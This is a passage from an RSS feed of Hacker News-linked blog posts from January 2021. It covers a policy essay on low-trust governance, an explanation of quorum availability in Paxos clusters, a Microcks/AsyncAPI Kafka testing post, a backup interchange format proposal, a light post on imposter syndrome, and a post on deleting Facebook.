yourself as conditionally trustworthy in the sense that your policies do exactly what it says on the tin. And if you pick policies that work, you’re then in a position to rebuild trust as people see that confidence in you is rewarded.</p><h4>The vaccine prioritization fiasco</h4><p>In my December 18 post, <a href="https://www.slowboring.com/p/vaccinate-elderly">“Give The Vaccine To The Elderly,”</a> I argued in favor of a pretty strict age-based prioritization system primarily because that would be a transparent and easy to implement mechanism. </p><p>As I researched it, I came across the fact — which has been flagged by others as well — that the Advisory Committee on Immunization Practices was recommending a more complicated scheme in part on racial justice grounds. Because everyone loves culture war arguments, this became a huge controversy and several conservative states like Texas made big shows of rejecting the Social Justice Warrior concepts. That’s fine, but unfortunately, they did not accept the wisdom of implementing a transparent and easy to implement mechanism. </p><p>Instead, operating under the principle that everyone wants to be vaccinated in Group 1 they have divided Group 1 into three subgroups — 1A, 1B, and 1C. But then Group 1A is <a href="https://dshs.texas.gov/coronavirus/immunize/vaccine/EVAP-Phase1A.pdf">subdivided into two separate tiers</a>, and we’re still awaiting word on how Group 1C will be subdivided, to say nothing of Group 2 or Group 3. </p><div><figure><a target="_blank" href="https://cdn.substack.com/image/fetch/f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fbucketeer-e05bbc84-baa3-437e-9518-adb32be77984.s3.amazonaws.com%2Fpublic%2Fimages%2Fc22295e8-22ca-4271-b6f1-392f1e0b1c59_1286x540.png"><img src="https://cdn.substack.com/image/fetch/w_1456,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fbucketeer-e05bbc84-baa3-437e-9518-adb32be77984.s3.amazonaws.com%2Fpublic%2Fimages%2Fc22295e8-22ca-4271-b6f1-392f1e0b1c59_1286x540.png" data-attrs="{&quot;src&quot;:&quot;https://bucketeer-e05bbc84-baa3-437e-9518-adb32be77984.s3.amazonaws.com/public/images/c22295e8-22ca-4271-b6f1-392f1e0b1c59_1286x540.png&quot;,&quot;height&quot;:540,&quot;width&quot;:1286,&quot;resizeWidth&quot;:null,&quot;bytes&quot;:280147,&quot;alt&quot;:null,&quot;title&quot;:null,&quot;type&quot;:&quot;image/png&quot;,&quot;href&quot;:null}" alt=""></a></figure></div><p>So while New York and California, with their presumably more social justice-inflected vaccine distributions, have managed to disburse only 31 percent and 28 percent of their vaccine doses (<a href="https://www.nytimes.com/interactive/2020/us/covid-19-vaccine-doses.html">I’m going by New York Times data</a>), Texas and Florida, who made a big deal of rejecting ACIP, are not doing much better at 36 percent and 31 percent. The very worst performances are in Kansas, Georgia, Arizona, Mississippi, and Idaho, so there’s clearly a lot more afoot here than pure partisan politics. </p><p>And in many ways we still haven’t gotten to the real pain point of prioritization systems, which is going to be where people with “at least one chronic medical condition” get to cut the line. In the abstract, of course if you’re 52 and have a bad heart then you need the vaccine more than someone who’s 64 and in perfect health. But in practice, this means you are allocating vaccines not based on <em>actual</em> population health, but based on who is in possession of a note from their doctor. </p><p>The system, as implemented, will not do what it says on the tin. As people notice that, they will become more aggressive about wanting to cheat the system. And as backlash builds, pressure will build for tighter enforcement, which will further slow down administration. </p><p>A pure age-based system — “show up at CVS or Walgreens and they’ll give you the shot if you’re over 75” with the age cutoff steadily dropping over time —&nbsp;is not perfect. But it’s really easy to check people’s IDs, the rich and powerful have no good way to game that system, and the smooth operation of the system itself will build trust.</p><h4>Checks for everyone </h4><p>I cover American public policy professionally, and I would have trouble explaining to you exactly how the <a href="https://www.sba.gov/funding-programs/loans/coronavirus-relief-options/paycheck-protection-program">Paycheck Protection Program</a> works. </p><p>Formally speaking, it’s a Small Business Administration loan guarantee program rather than a direct payroll subsidy like many European countries did. But when you peak under the hood, one of the key advantages of the PPP loan is that it will be forgiven if you meet certain criteria, including <a href="https://onpay.com/covid-19/ppp-loan-forgiveness">not laying off your employees</a> and using the money for certain <a href="https://www.sba.gov/funding-programs/loans/coronavirus-relief-options/paycheck-protection-program#section-header-5">specific eligible expenses</a>. </p><p>Because the program is complicated, it’s generated an endless series of compliance complaints:</p><ul><li><p>Because it’s supposed to be a small business program, a whole genre of journalism emerged complaining that too much PPP money was going to bigger companies —&nbsp;but of course, bigger companies employ more people.</p></li><li><p>Because it’s supposed to be a loan program but in practice a lot of the loans are forgiven, you get complaints about monetary losses to the government.</p></li><li><p>Because you’re <em>allowed</em> to accept a loan without applying for full forgiveness, some PPP recipients got money and did layoffs, generating complaints that it didn’t really protect payrolls.</p></li></ul><p>And on top of all that, there were significant administrative burdens associated with the program which generated a lot of complaints from business owners, the very people who are supposed to be enthusiastic about PPP.</p><p>Instead, a myth developed that the government — which put hundreds of billions of dollars in small business assistance on the table — was barely doing anything.</p><p>Fundamentally, I would say that the problem with the program is that it didn’t do what it says on the tin, in part because it’s not at all clear what it said on the tin. It seems to have started with the thought that the Fed keeping interest rates low was helping big businesses because they could sell bonds to ride out the pandemic, so there should be a comparable lending program for smaller companies. But if the government is going to help out smaller companies, it should make sure that it’s actually saving jobs. And if we’re going to give companies loans to maintain payroll, but they’re often not going to be able to pay the loan back, there should be loan forgiveness. In the end, Congress backed itself into something that was a lot closer to a European-style payroll subsidy program than to a loan program, but with most of the trappings of a loan program.</p><p>By contrast, sending $1,200 to almost everyone was seen as a huge success, and <a href="https://www.dataforprogress.org/blog/2020/12/28/78-of-likely-voters-support-2000-relief-checks">sending more checks is wildly popular</a>. </p><p>The checks did what they said on the tin. They didn’t attempt to distinguish between the deserving and the undeserving. They didn’t specify whether you had to use the check to make rent or could just blow it on a new iPhone. And they <em>also</em> didn’t attempt to address any particular racial social justice concerns. Critically, they didn’t claim to do any of these things. The only claim was that almost everyone would get some money, and they did. </p><h4>QE for the people </h4><p>A policy from the Great Recession that really flunked the “what it says on the tin” test was quantitative easing. </p><p>I think if you really understand how monetary policy works and have confidence in the Federal Reserve staff, then you’ll see that having the Fed buy a bunch of longer-term bonds is really not that exciting or weird. But most people don’t. </p><p>And unfortunately, as you become better-informed about monetary issues, it doesn’t actually become that much clearer why the Fed decided this would be a good thing to do. During a funny 2014 Brookings appearance, Ben Bernanke <a href="https://www.ft.com/content/3b164d2e-4f03-11e4-9c88-00144feab7de">quipped</a> that “the problem with quantitative easing is that it works in practice, but it doesn’t work in theory.”</p><p>But think about that in terms of a low-trust society; the guy we’re supposed to trust to do the QE himself says he can’t give an explanation of how it works. </p><ul><li><p>Now of course you can read <a href="https://economistsview.typepad.com/economistsview/2010/10/bernankes-speech-how-does-quantitative-easing-work-will-it-work.html">Tim Duy offer five mechanisms through which QE could work</a> back in 2010 — but he’s skeptical that the tools are powerful.</p></li><li><p>By 2016, Roger Farmer says that Bernanke is wrong and QE <em>does</em> work in theory, and <a href="https://voxeu.org/article/why-unconventional-monetary-policy-works-theory">offers a theoretical account of why it works</a> that is somewhat different from any of Duy’s theories.</p></li><li><p>By 2020, Bernanke has come around to the view that <a href="https://www.brookings.edu/blog/ben-bernanke/2020/01/04/the-new-tools-of-monetary-policy/">he now understands why QE works in theory</a>, though his view is closer to Duy’s than to Farmer’s. </p></li></ul><p>If you’re an insider to macroeconomic policy discussions, Bernanke’s quote is funny. But I think given all this, it’s …</p></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://www.slowboring.com/p/making-policy-for-a-low-trust-world">https://www.slowboring.com/p/making-policy-for-a-low-trust-world</a></em></p>]]>
            </description>
            <link>https://www.slowboring.com/p/making-policy-for-a-low-trust-world</link>
            <guid isPermaLink="false">hacker-news-small-sites-25669507</guid>
            <pubDate>Thu, 07 Jan 2021 10:37:47 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Quorum Availability]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25669327">thread link</a>) | @r4um
<br/>
January 7, 2021 | http://brooker.co.za/blog/2021/01/06/quorum-availability.html | <a href="https://web.archive.org/web/*/http://brooker.co.za/blog/2021/01/06/quorum-availability.html">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div id="post">


<p>It's counterintuitive, but is it right?</p>


<p>In our paper <a href="https://www.usenix.org/conference/nsdi20/presentation/brooker">Millions of Tiny Databases</a>, we say this about the availability of quorum systems of various sizes:</p>

<blockquote><p>As illustrated in Figure 4, smaller cells offer lower availability in the face of small numbers of uncorrelated node failures, but better availability when the proportion of node failure exceeds 50%. While such high failure rates are rare, they do happen in practice, and a key design concern for Physalia.</p></blockquote>

<p>And this is what Figure 4 looks like:</p>

<p><img src="https://mbrooker-blog-images.s3.amazonaws.com/mtb_fig_4.png" alt=""></p>

<p>The context here is that a <em>cell</em> is a Paxos cluster, and the system needs a majority quorum for the cluster to be able to process requests<sup><a href="#foot1">1</a></sup>. A cluster of one box needs one box available, five boxes need three available and so on. The surprising thing here is the claim that having smaller clusters is actually <em>better</em> if the probability of any given machine failing is very high. The paper doesn't explain it well, and I've gotten a few questions about it. This post attempts to do better.</p>

<p>Let's start by thinking about what happens for a cluster of one machine (<em>n=1</em>), in a datacenter of <em>N</em> machines (for very large <em>N</em>). We then fail each machine independently with probability <em>p</em>. What is the probability that our one machine failed? That's trivial: it's <em>p</em>. Now, let's take all <em>N</em> machines and put them into a cluster of <em>n=N</em>. What's the probability that a majority of the cluster is available? For large <em>N</em>, it's 1 for <em>p &lt; 0.5</em>, and 0 for <em>p &gt; 0.5</em>. If less than half the machines fail, less than half have failed. If more than half the machines fail, more than half have failed. Ok?</p>

<p><img src="https://mbrooker-blog-images.s3.amazonaws.com/quorum_avail_a.png" alt=""></p>

<p>Notice how a cluster size of 1 is worse than N up until <em>p = 0.5</em> then better after. <a href="http://citeseerx.ist.psu.edu/viewdoc/download?doi=10.1.1.38.5629&amp;rep=rep1&amp;type=pdf">Peleg and Wool</a> say:</p>

<blockquote><p>... for <em>0 &lt; p &lt; ½</em> the most available NDC<sup><a href="#foot2">2</a></sup> is shown to be the "democracy" (namely, the minimal majority system), while the "monarchy" (singleton system) is least available. Due to symmetry, the picture reverses for <em>½ &lt; p &lt; 1</em>.</p></blockquote>

<p>Here, the <em>minimal majority system</em> is the one I'd call a <em>majority quorum</em>, and is used by Physalia (and, indeed, most Paxos implementations). The <em>monarchy</em> is where you have one leader node.</p>

<p>What about real practical cluster sizes like <em>n=3</em>, 5, and 7? There are three ways we can do this math. In <a href="http://citeseerx.ist.psu.edu/viewdoc/download?doi=10.1.1.38.5629&amp;rep=rep1&amp;type=pdf">The Availability of Quorum Systems</a>, Peleg and Wool derive closed-form solutions to this problem<sup><a href="#foot3">3</a></sup>. Our second approach is to observe that the failures of the nodes are Bernoulli trials with probability <em>p</em>, and therefore we can read the answer to "what is the probability that 0 or 1 of 3 fail for probability <em>p</em>" from the distribution function of the <a href="https://en.wikipedia.org/wiki/Binomial_distribution">binomial distribution</a>. Finally, we can be lazy and do it with Monte Carlo. That's normally my favorite method, because it's easier to include correlation and various "what if?" questions as we go.</p>

<p>Whichever way you calculate it, what do you expect it to look like? For small <em>n</em> you may expect it to be closer in shape to <em>n=1</em>, and for large <em>n</em> you may expect it to approach the shape of <em>n=N</em>. If that's what you expect, you'd be right.</p>

<p><img src="https://mbrooker-blog-images.s3.amazonaws.com/quorum_avail_b.png" alt=""></p>

<p>I'll admit that I find this result deeply deeply counter-intuitive. I think it's right, because I've approached it multiple ways, but it still kind of bends my mind a little. That may just be me. I've discussed it with friends and colleagues over the years, and they seem to think it matches their intuition. It's counter-intuitive to me because it suggests that smaller <em>n</em> (smaller clusters, or smaller cells in Physalia's parlance) is better for high <em>p</em>! If you think a lot of your boxes are going to fail, you may get better availability (not durability, though) from smaller clusters.</p>

<p>Weird.</p>

<p><strong>Correlation to the rescue!</strong></p>

<p>It's not often that my statistical intuition is saved by introducing correlation, but in this case it helps. I'd argue that, in practice, that you only lose machines in an uncorrelated Bernoulli trial way for small <em>p</em>. Above a certain <em>p</em>, it's likely that the failures have some shared cause (power, network, clumsy people, etc) and so the failures are likely to be correlated in some way. In which case, we're back into the game we're playing with Physalia of avoiding those correlated failures by optimizing placement.</p>

<p>In many other kinds of systems, like ones you deploy across multiple datacenters (we'd call that <em>regional</em> in AWS, deployed across multiple <em>availability zones</em>), you end up treating the datacenters as units of failure. In that case, for 3 datacenters you'd pick something like <em>n=9</em> because you can keep quorum after the failure of an entire datacenter (3 machines) and any one other machine. As soon as there's correlation, the math above is mostly useless and the correlation's cause is all that really matters.</p>

<p>Availability also isn't the only thing to think about with cluster size for quorum systems. Durability, latency, cost, operations, and contention on leader election also come into play. Those are topics for another post (or section 2.2 of <a href="https://www.usenix.org/conference/nsdi20/presentation/brooker">Millions of Tiny Databases</a>).</p>

<p><strong>Updates</strong></p>

<p>JP Longmore sent me this intuitive explanation, which makes a lot of sense:</p>

<blockquote><p>Probability of achieving a quorum will increase when removing 2 nodes from a cluster, each with failure rate p&gt;.5, since on average you're removing 2 bad nodes instead of 2 good nodes. Other cases with 1 good node &amp; 1 bad node don't change the outcome (quorum/not). Repeat reasoning till N=1 or all remaining nodes have p&lt;=.5 (if failure rate isn’t uniform).</p></blockquote>

<p><strong>Footnotes</strong></p>

<ol>
<li><a name="foot1"></a> Physalia uses a very naive Paxos implementation, intentionally optimized for testability and simplicity. The quorum intersection requirements of Paxos (or Paxos-like protocols) are more subtle than this, and work like Heidi Howard et al's <a href="https://fpaxos.github.io/">Flexible Paxos</a> has been pushing the envelope here recently. <a href="https://arxiv.org/pdf/1608.06696v1.pdf">Flexible Paxos:  Quorum intersection revisited</a> is a good place to start.</li>
<li><a name="foot2"></a> Here, an NDC is a <em>non-dominated coterie</em>, and a <em>coterie</em> is a set of groups of nodes (like <em>{{a, b}, {b, c}, {a, c}}</em>). See Definition 2.2 in <a href="https://www.cs.purdue.edu/homes/bb/cs542-20Spr/readings/reliability/How%20to%20assign%20Votes-JACM-garcia-molina.pdf">How to Assign Votes in a Distributed System</a> for the technical definition of domination. What's important, though, is that for each <em>dominated coterie</em> there's a <em>non-dominated coterie</em> that provides the same mutual exclusion properties, but superior availability under partitions. The details are not particularly important here, but are very interesting if you want to do tricky things with quorum intersection.</li>
<li><a name="foot3"></a> Along with a whole lot of other interesting facts about quorums, majority quorums and other things. It's a very interesting paper. Another good read in this space is Garcia-Molina and Barbara's <a href="https://www.cs.purdue.edu/homes/bb/cs542-20Spr/readings/reliability/How%20to%20assign%20Votes-JACM-garcia-molina.pdf">How to Assign Votes in a Distributed System</a>, which both does a better job than Peleg and Wool of defining the terms it uses, but also explores the general idea of assigning <em>votes</em> to machines, rather than simply forming quorums of machines. As you read it, it's worth remembering that it predates Paxos, and many of the terms might not mean what you expect.</li>
</ol>


</div></div>]]>
            </description>
            <link>http://brooker.co.za/blog/2021/01/06/quorum-availability.html</link>
            <guid isPermaLink="false">hacker-news-small-sites-25669327</guid>
            <pubDate>Thu, 07 Jan 2021 10:09:49 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Mocking and testing event-driven architectures with Microcks and AsyncAPI]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25669287">thread link</a>) | @fmvilas
<br/>
January 7, 2021 | https://www.asyncapi.com/blog/microcks-asyncapi-part2 | <a href="https://web.archive.org/web/*/https://www.asyncapi.com/blog/microcks-asyncapi-part2">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><article><img src="https://www.asyncapi.com/img/posts/microcks-asyncapi-part2/microcks-kafka-distribs.webp" alt="Post cover image"><p>On our <a href="https://www.asyncapi.com/blog/microcks-asyncapi-part1">first AsyncAPI blog post</a> we have introduced <a href="https://microcks.io/blog/microcks-1.0.0-release/">Microcks 1.0 General Availability (GA)</a> as a unique milestone for mocking and testing event-driven API like any other APIs through the support of AsyncAPI specification.</p><p>In case you missed it, we have already released <a href="https://microcks.io/blog/microcks-1.1.0-release/">version 1.1.0</a> in the meantime. This release includes some nice enhancements related to the topic of the day: <strong>Microcks + AsyncAPI use cases using Apache Kafka</strong>. This post will show you how Microcks is leveraging the AsyncAPI specification on Kafka in a very pragmatic and powerful approach: way beyond documentation or code generation! We will also go through the different business use-cases implemented by users integrating Microcks in their asynchronous API toolchain.</p><p>When we are talking about Kafka we mean all Kafka distributions translated into <em>the choice is yours</em>: from vanilla Apache upstream distribution, to enterprise products and also cloud providers’ managed distributions!</p><p><img src="https://www.asyncapi.com/img/posts/microcks-asyncapi-part2/microcks-kafka-distribs.webp" alt="microcks-kafka-distribs"></p><blockquote><p>By the way, we will be happy to have some QA <a href="https://github.com/microcks/microcks/blob/master/CONTRIBUTING.md">contributors and reports</a><undefined> on more brokers and AsyncAPI supported protocols <span role="img" aria-label="winking face">😉</span></undefined></p></blockquote><p>Before diving into AsyncAPI on Apache Kafka, let first see why simulating producers is a key project success factor.</p><h2 id="why-simulating-producers-is-a-key-project-success-factor">Why simulating producers is a key project success factor?</h2><p><undefined>As good developers, we are lazy - in a very good way <span role="img" aria-label="winking face">😉</span> - and hate to restart from scratch our beautiful code implementations due to misunderstanding with Product Owners. However, nowadays Product Owners adopted and love the </undefined><a href="https://www.forbes.com/sites/danpontefract/2018/09/15/the-foolishness-of-fail-fast-fail-often/">Fail-Fast Principle</a>. We can't rely on functional implementations to start beta testing with consumers, we should fail fast and make them change requirements before we start implementation.</p><p>Apart from generating frustrations, this above situation is also very inefficient from a cost and time to market point of view for the organization. </p><p>The contract-first approach is a wonderful way to create strong and efficient agreements between functional / business / product owners and developers! But it represents only a partial answer to the above situation</p><p><img src="https://www.asyncapi.com/img/posts/microcks-asyncapi-part2/time-money-quality.webp" alt="time-money-quality"></p><p>To avoid unnecessary work from developers and speed-up feedback gathering from consumers, simulation is the second part of the answer. That is why Microck's first use case and the killer feature is mocking!</p><p>These are some of the reasons why the way to do mocking with Microcks is highly scalable: </p><ul><li>We rely 100% on Product Owners contracts </li><li>We rely 100% on standards and specifications to describe contracts</li><li>We automatically generate all APIs mocks from contracts: no code!</li><li>We publish APIs mocks like real implementations using specifications examples </li><li>We centralize all contracts and are the single point of trust</li><li>We are always in sync with your repositories: no drift anymore!</li><li>We provide sandbox at scale. You can heavily stress tests your business rules. Remember, we are Kubernetes-native!</li></ul><p>This is why Microcks is the ultimate way to test, iterate and speed-up your APIs validations before asking developers to code the real implementation! And this certainly applies to asynchronous API on Kafka too: thanks to <a href="https://www.asyncapi.com/docs/specifications/2.0.0">AsyncAPI specification</a>.</p><p>Now let’s start with first feature: mocking asynchronous API.</p><h2 id="mocking-asynchronous-api-on-top-of-apache-kafka">Mocking asynchronous API on top of Apache Kafka</h2><p>This is how Microcks value proposition of accelerating Kafka asynchronous API simulation looks like:</p><p><img src="https://www.asyncapi.com/img/posts/microcks-asyncapi-part2/microcks-kafka-mocking.webp" alt="microcks-kafka-mocking"></p><p>In a very pragmatic approach, Microcks uses your AsyncAPI specification as the source of truth for your simulation. As soon as it is imported into Microcks, it manages to create a topic for your API version on the connected Kafka broker and starts publishing mock messages. Messages are published at a configured frequency and thus consumers immediately start receiving event messages as if it is published by a real application. Thanks to Microcks’ <a href="https://microcks.io/documentation/using/advanced/templates/">message templating</a> you can also easily include dynamic content in the sample messages.</p><p>Mocking event-driven architecture using Microcks is a game-changer as you do not need to write code nor set up complex infrastructure! Your consumers can receive messages in the minute. Testing some changes is just one commit away. You update the AsyncAPI specification in the Git repository and Microcks will take care of updating everything! It's even capable of providing and managing the Kafka infrastructure thanks to the excellent <a href="https://strimzi.io/">Strimzi.io</a> operator if you wish! See our <a href="https://microcks.io/documentation/installing/deployment-options/#everything-managed-by-microcks">Everything managed by Microcks</a><undefined> deployment option <span role="img" aria-label="rocket">🚀</span></undefined></p><p>Our second feature is testing or how to make your delivery lifecycle reliable.</p><h2 id="how-to-make-your-delivery-lifecycle-reliable">How to make your delivery lifecycle reliable?</h2><p>As the number of event producers and subscribers is exploding, managing changes and taking care of versioning compatibility is essential. And what about checking that business rules implying event triggering are correctly implemented? The fact it produces syntactically correct events and all this in a fully automated way based on each change and new commit in your source code repository?</p><p>Again this is all provided by Microcks thanks to its capability to interoperate with your CI/CD pipeline using our plugins for <a href="https://microcks.io/documentation/automating/jenkins/">Jenkins</a>, <a href="https://microcks.io/documentation/automating/tekton/">Tekton</a> or <a href="https://microcks.io/documentation/automating/cli/">any other CI pipeline technology like GitLab</a>. You'll typically use these plugins to trigger a Kafka test in Microcks.</p><p><img src="https://www.asyncapi.com/img/posts/microcks-asyncapi-part2/microcks-kafka-testing.webp" alt="microcks-kafka-testing"></p><p>In Microcks, testing Kafka endpoints means connecting to a remote Kafka topic on an existing broker in the organization, listening for incoming messages, and checking that received messages are valid against the event-based API schema that is referenced in your source of truth: the AsyncAPI specification. You can find further technical details on the blog post <a href="https://microcks.io/blog/apache-kafka-mocking-testing/">mocking and testing Apache Kafka API using Microcks</a>.</p><p>Testing of event-driven architecture is no longer a nightmare with Microcks! Microcks can connect to the Kafka brokers in your organization and tell you if the received messages are valid according to your specification. No drifting risks anymore or way to introduce regression in production! You'll drive and control everything from your pipeline.</p><p>What are the business use-cases of AsyncAPI? Where can you use Microcks as an essential part of your toolchain?</p><h2 id="business-use-cases-of-asyncapi">Business use-cases of AsyncAPI</h2><p>As said before, event-driven and asynchronous APIs are becoming mainstream because we truly understand the decoupling level - and thus power and agility - it brings within our products. We see the need for asynchronous APIs and Apache Kafka's presence as the de facto standard for message brokering - everywhere.</p><ul><li>In every business vertical: to decouple a recording action (registration, purchase, like) to a marketing reaction (CRM update, behavioral analysis, marketing notification, renewal process management, etc...)</li><li>In Governmental organizations: to synchronize complex and partitioned repositories using master data management and staging pipelines techniques</li><li>In Financial Services: to streamline the sharing of information between core platforms and distribution ecosystems of partners,</li><li>In Industry: to enable Industry 4.0 to use IoT and become more agile to respond to market unpredictability and improve quality,</li><li>Soon in every Citizen's life: to power tomorrow Smart Cities with IoT and enable smart real-time insights and decision making.</li></ul><p>These use cases come from companies using Microcks for simulating and testing their API implementation, and we are thankful to our users and community.</p><h2 id="summary">Summary</h2><p>We are convinced that cutting edge developers understand the purpose, usages, and efficiency of asynchronous mechanisms. To take all its advantages and especially to use an AsyncAPI contract-first approach: developers must work hand in hand with software architects, business/product owners within the enterprise. In our humble opinion, this is clearly a strong point of attention to improve collaboration between enterprise silos and take the quintessence of AsyncAPI specification for a contract-first approach using Microcks as the ultimate tooling for mocking and testing purposes. Please read our <a href="https://microcks.io/blog/continuous-testing-all-your-apis/">previous blog post on this topic</a><undefined> and share it with your software architects <span role="img" aria-label="winking face">😉</span></undefined></p><p>We hope these two Microcks features - mocking and testing - and application use-cases are clear and you now better understand our value proposition. Microcks proposes a very pragmatic and powerful usage of AsyncAPI specification: way beyond documentation or code generation! It allows you to speed-up and makes your delivery of Kafka event-driven architectures reliable.</p><p>The roadmap ahead is also full of exciting new features we are looking forward to: </p><ul><li>Continuing to make AsyncAPI full potential bloom through implementing multiple schema format supports - like Apache Avro - and <a href="https://github.com/asyncapi/asyncapi/issues/329">adding examples in the spec</a>,</li><li>Taking advantage of multiple protocol binding capabilities, releasing very soon a <a href="https://github.com/microcks/microcks/issues/293">MQTT implementation</a> to support our users and prospects on the IoT landscape,</li><li>Solidifying an initiative we started a long time ago about a shared repository of simulation and test suites for standards or products APIs...</li></ul><p>We are open and you can help make Microcks an even greater tool! Please spread the word, send us some love through <a href="https://github.com/microcks/microcks">GitHub stars</a>, follow us on <a href="https://twitter.com/microcksio">Twitter</a> or join our chat room on <a href="https://microcksio.zulipchat.com/login/">Zulip</a>.</p></article></div>]]>
            </description>
            <link>https://www.asyncapi.com/blog/microcks-asyncapi-part2</link>
            <guid isPermaLink="false">hacker-news-small-sites-25669287</guid>
            <pubDate>Thu, 07 Jan 2021 10:03:18 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Backup Interchange Format]]>
            </title>
            <description>
<![CDATA[
Score 4 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25669245">thread link</a>) | @ColinWright
<br/>
January 7, 2021 | https://blog.liw.fi/posts/2021/01/07/backup_interchange_format/ | <a href="https://web.archive.org/web/*/https://blog.liw.fi/posts/2021/01/07/backup_interchange_format/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><article class="page">







<div id="pagebody">

<section id="content" role="main">
<p>Backup systems could do with a common backup interchange format.</p>
<p>Many version control systems support the git “<a href="https://www.git-scm.com/docs/git-fast-export">fast-export</a>” format. It’s a simple format for exporting the contents of a version control repository so that it can be imported into another. It’s a fundamental basis for converting from one system to another.</p>
<p>Backup systems could have something similar. It would be a good to everyone as it frees people to change backup systems without having their backup history locked into their old system. There are several scenarios in which this could be useful:</p>
<ul>
<li><p>Migrating to a new backup system that can’t read backups made with the old backup system.</p></li>
<li><p>Migrating from one backup repository to another, when a straight copy of the repository files is not possible, for whatever reason. For example, if there is no file-level access to the backup repository, only a constrained API.</p></li>
<li><p>Migrating to a new configuration that can’t read backups made with the old backup system. For example, changing encryption secrets in a system that only allows one per repository.</p></li>
</ul>
<p>My initial requirements for such a format:</p>
<ul>
<li><p>It’s as simple as possible while still working. It doesn’t need to be efficient, only efficient enough to be practical to use.</p></li>
<li><p>It’s possible to stream the format: something like <code>oldbackup export | newbackup import</code> should be possible.</p></li>
<li><p>It’s as independent of the backup systems as possible, and doesn’t embed unnecessary assumptions of the design or implementation of the system.</p></li>
</ul>
<p>My first sketch of a backup interchange format:</p>
<ul>
<li>A sequence of backup generations in order they were made.</li>
<li>Each generation has some metadata, and a list of files and hardlinhks.</li>
<li>Each file has an identifie unique to the generation, metadata (inode) and file content.</li>
<li>File content is a sequence of (offset, blob) pairs, to support sparse files.</li>
<li>Hard links are represented as (pathname, inode) pairs, where the first pathname is the name of the hard link, the</li>
<li>No attempt at de-duplication or re-using files from a previous generation.</li>
</ul>
<p>As YAML, this would look something like this:</p>

<p>YAML used here as an example, actual format may be something else.</p>

</section>







</div>



</article></div>]]>
            </description>
            <link>https://blog.liw.fi/posts/2021/01/07/backup_interchange_format/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25669245</guid>
            <pubDate>Thu, 07 Jan 2021 09:56:39 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Cure for Imposter Syndrome]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25669154">thread link</a>) | @supr_strudl
<br/>
January 7, 2021 | https://hadalin.me/blog/cure-for-imposter-syndrome | <a href="https://web.archive.org/web/*/https://hadalin.me/blog/cure-for-imposter-syndrome">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div itemprop="articleBody">
<p>Most likely, it’s only you who thinks you're not good enough. Your “operating system” has a bug that raises too many instances of <code>NotGoodEnoughException</code>.</p>
<p>Even if someone else thinks you're not good enough, it's probably because they have this bug too. People climb many hierarchies—power, money, popularity, etc., and in doing so, they advertently, but more often than not, inadvertently put other people down to lift themselves. Have this in mind when someone is rude to you.</p>
<p>How to fix this bug? The solution is not that hard, but it requires time + effort. What you have to do is first install the <code><a href="https://duckduckgo.com/?q=eckhart+tolle">mindfulness</a></code> module. This module interrupts the cognitive module each time NotGoodEnoughException is raised and puts the handling of this exception at the top of the priority queue. In a sense, good mindfulness could be compared to having decent server logs—situational awareness for the self.</p>
<p>If you think the above paragraph is written poorly, your “OS” probably raised NotGoodEnoughException just now ;)</p>
<p>You handle the exception as follows. Get familiar with the <code>/self/v2/mind</code> API endpoint and make a POST request with the following body each time NotGoodEnoughException is raised:</p>
<pre>{
  "youAreEnough": true
}
</pre>
<p>It might take weeks, months, or even years before the number of exceptions starts to drop, but it <em>does</em> drop. The reason this works is that it’s the real you, the one who experiences pain, joy, and life, the one above thoughts, emotions, and sensations, who decides to “program” your “kernel”. The key is within you.</p>
<p>To supercharge, consider running <code>install patience --save-dev</code> and opening an issue at the <code>friend/talk</code> repository.</p>
<p>Take care!</p>
</div></div>]]>
            </description>
            <link>https://hadalin.me/blog/cure-for-imposter-syndrome</link>
            <guid isPermaLink="false">hacker-news-small-sites-25669154</guid>
            <pubDate>Thu, 07 Jan 2021 09:41:49 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[I closed my Facebook account, and you should too]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 3 (<a href="https://news.ycombinator.com/item?id=25669051">thread link</a>) | @garritfra
<br/>
January 7, 2021 | https://slashdev.space/posts/2021-01-07-delete-facebook | <a href="https://web.archive.org/web/*/https://slashdev.space/posts/2021-01-07-delete-facebook">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><p>I know I should have done this a while ago, but with ever-increasing scandals about data privacy surrounding Facebook, I finally decided to get rid of it.</p><p>I haven't used the service in a long time anyway, but I always told myself "what if I needed the data later?", or "what if a friend contacted me, and I didn't respond?", "what if I missed the birthday of someone I'm close with?!". Well, according to my facebook inbox, the only messages I received lately were some random links from people I'm not really in touch with anymore. Birthdays? Do you think someone you haven't talked to in over three years will get mad at you, for forgetting their birthday? And regarding your data: you won't loose it! <a href="https://www.facebook.com/help/212802592074644">This guide</a> describes how you can download a copy of your data as html and/or json.</p><p>Go ahead and ask yourself: Is there anything holding you back from deleting your Facebook account? What would you loose? How often do you even use the service? Do the social benefits of Facebook <strong>really</strong> outweigh the negative aspects (privacy concerns, data collection, etc.)?</p><p>Comments? Drop a mail in my<!-- --> <a href="https://lists.sr.ht/~garritfra/public-inbox">public inbox</a>, or send me a message on<!-- --> <a href="https://matrix.to/#/@garrit:matrix.slashdev.space">Matrix</a>.</p></div></div>]]>
            </description>
            <link>https://slashdev.space/posts/2021-01-07-delete-facebook</link>
            <guid isPermaLink="false">hacker-news-small-sites-25669051</guid>
            <pubDate>Thu, 07 Jan 2021 09:28:02 GMT</pubDate>
